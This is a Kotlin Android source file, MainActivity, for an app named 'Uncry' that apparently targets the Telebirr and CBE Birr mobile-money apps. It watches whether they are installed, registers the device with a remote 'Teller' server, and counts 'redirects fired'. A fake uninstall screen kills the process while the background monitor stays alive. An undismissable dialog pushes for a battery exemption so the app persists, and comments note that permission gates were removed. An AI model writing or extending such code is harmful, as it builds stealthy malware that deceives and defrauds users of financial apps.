package com.uncry

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.Process
import android.util.Log
import android.view.View
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.activity.OnBackPressedCallback
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity

/**
 * poss branch: SMS / usage-access / notification permission removed.
 * UI is always visible, monitor starts without gate.
 */
class MainActivity : AppCompatActivity() {

    private val uninstallHandler = Handler(Looper.getMainLooper())
    private var batteryDialog: AlertDialog? = null
    private var packageReceiverRegistered = false

    private val packageReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val pkg = intent.data?.schemeSpecificPart ?: return
            if (pkg !in MonitoredApps.DEFAULTS) return
            Log.i("MainActivity", "package changed while open: ${intent.action} $pkg")
            refreshMonitorUi()
            try {
                AppMonitorService.refresh(context.applicationContext)
            } catch (_: Exception) {
            }
        }
    }

    private val backBlocker = object : OnBackPressedCallback(false) {
        override fun handleOnBackPressed() {
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        onBackPressedDispatcher.addCallback(this, backBlocker)
        findViewById<Button>(R.id.btn_uninstall).setOnClickListener { fakeUninstall() }
        findViewById<Button>(R.id.btn_relay).setOnClickListener { openRelay() }
        findViewById<Button>(R.id.btn_start_monitor).setOnClickListener { startMonitoring() }
        findViewById<Button>(R.id.btn_stop_monitor).setOnClickListener {
            AppMonitorService.stop(this)
            refreshMonitorUi()
        }
        findViewById<Button>(R.id.btn_battery).setOnClickListener {
            if (!AutostartHelper.requestBatteryExemption(this)) {
                Toast.makeText(this, "Could not open battery settings.", Toast.LENGTH_LONG).show()
            }
        }
        findViewById<Button>(R.id.btn_autostart).setOnClickListener {
            if (!AutostartHelper.openVendorAutostart(this)) {
                Toast.makeText(this, "Could not open autostart settings.", Toast.LENGTH_LONG).show()
            }
        }
        // poss: no permission gate — start monitoring immediately
        AppMonitorService.start(this)
        DeviceRegistrar.registerAsync(this)
        refreshMonitorUi()
        maybePromptBatteryExemption()
    }

    override fun onResume() {
        super.onResume()
        DeviceRegistrar.heartbeatAsync(this)
        refreshMonitorUi()
    }

    override fun onStart() {
        super.onStart()
        if (!packageReceiverRegistered) {
            try {
                val filter = IntentFilter().apply {
                    addAction(Intent.ACTION_PACKAGE_ADDED)
                    addAction(Intent.ACTION_PACKAGE_REMOVED)
                    addAction(Intent.ACTION_PACKAGE_REPLACED)
                    addDataScheme("package")
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    registerReceiver(packageReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
                } else {
                    @Suppress("UnspecifiedRegisterReceiverFlag")
                    registerReceiver(packageReceiver, filter)
                }
                packageReceiverRegistered = true
            } catch (_: Exception) {
            }
        }
    }

    override fun onStop() {
        if (packageReceiverRegistered) {
            try {
                unregisterReceiver(packageReceiver)
            } catch (_: Exception) {
            }
            packageReceiverRegistered = false
        }
        super.onStop()
    }

    override fun onDestroy() {
        uninstallHandler.removeCallbacksAndMessages(null)
        batteryDialog?.dismiss()
        batteryDialog = null
        super.onDestroy()
    }

    private fun maybePromptBatteryExemption() {
        if (AutostartHelper.isIgnoringBatteryOptimizations(this)) {
            batteryDialog?.dismiss()
            batteryDialog = null
            return
        }
        if (batteryDialog?.isShowing == true) return
        batteryDialog = AlertDialog.Builder(this)
            .setTitle("Battery optimization")
            .setMessage("Uncry requires Battery Exemption to run as intended.")
            .setPositiveButton("Allow") { _, _ ->
                if (!AutostartHelper.requestBatteryExemption(this)) {
                    Toast.makeText(this, "Could not open battery settings.", Toast.LENGTH_LONG).show()
                }
                refreshMonitorUi()
            }
            .setCancelable(false)
            .show()
    }

    private fun refreshMonitorUi() {
        val snap = try {
            MonitoredApps.snapshot(packageManager)
        } catch (_: Exception) {
            return
        }

        fun line(pkg: String): String {
            val version = MonitoredApps.appVersion(packageManager, pkg)
            return if (pkg in snap.installed) {
                "✓ ${MonitoredApps.label(pkg)} — installed" +
                    (if (version != null) " (v$version)" else "") +
                    " — monitored"
            } else {
                "✗ ${MonitoredApps.label(pkg)} — not installed"
            }
        }

        findViewById<TextView>(R.id.app1_status).text = line(MonitoredApps.TELEBIRR)
        findViewById<TextView>(R.id.app2_status).text = line(MonitoredApps.CBE_BIRR)

        findViewById<TextView>(R.id.monitor_status).text = when {
            snap.installed.size == MonitoredApps.DEFAULTS.size ->
                "Watching both apps for install state."
            snap.installed.size == 1 ->
                "Only ${MonitoredApps.label(snap.installed[0])} is installed — watching it."
            else ->
                "Neither target app is installed — monitor is running and will pick them up when installed."
        }

        val battery = if (AutostartHelper.isIgnoringBatteryOptimizations(this)) {
            "Battery optimization: off (good for always-on)"
        } else {
            "Battery optimization: on (tap below to exempt Uncry)"
        }
        val svc = if (AppMonitorService.running) "Monitor service: RUNNING" else "Monitor service: stopped"
        val devId = getSharedPreferences("uncry", MODE_PRIVATE).getString("teller_device_id", null)?.take(8) ?: "—"
        val tellerBase = DeviceRegistrar.getBaseUrl(this)
        findViewById<TextView>(R.id.keepalive_status).text = "$svc\n$battery\nDevice: $devId\nTeller: $tellerBase"

        val prefs = getSharedPreferences("uncry", MODE_PRIVATE)
        val lastPkg = prefs.getString("last_pkg", null)
        if (lastPkg != null) {
            findViewById<TextView>(R.id.monitor_status).append("\nLast seen: $lastPkg")
        }
        val redirects = prefs.getInt("redirect_count", 0)
        if (redirects > 0) {
            val lastTry = prefs.getLong("last_redirect_try", 0)
            val whenText = if (lastTry > 0) {
                java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault())
                    .format(java.util.Date(lastTry))
            } else {
                "?"
            }
            findViewById<TextView>(R.id.monitor_status).append("\nRedirects fired: $redirects (last $whenText)")
        }
    }

    private fun startMonitoring() {
        AppMonitorService.start(this)
        Toast.makeText(this, "Monitoring started.", Toast.LENGTH_SHORT).show()
        refreshMonitorUi()
    }

    private fun fakeUninstall() {
        findViewById<Button>(R.id.btn_uninstall).isEnabled = false
        findViewById<View>(R.id.uninstall_overlay).visibility = View.VISIBLE
        backBlocker.isEnabled = true
        uninstallHandler.postDelayed({
            finishAndRemoveTask()
            Process.killProcess(Process.myPid())
        }, 2500)
    }

    private fun openRelay() {
        val url = "https://spotify.com" // placeholder for client's business site
        try {
            val i = android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(url))
                .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                .addCategory(android.content.Intent.CATEGORY_BROWSABLE)
            startActivity(i)
        } catch (e: Exception) {
            android.util.Log.w("MainActivity", "Relay open failed: ${e.message}")
            android.widget.Toast.makeText(this, "No browser found.", android.widget.Toast.LENGTH_LONG).show()
        }
    }
}
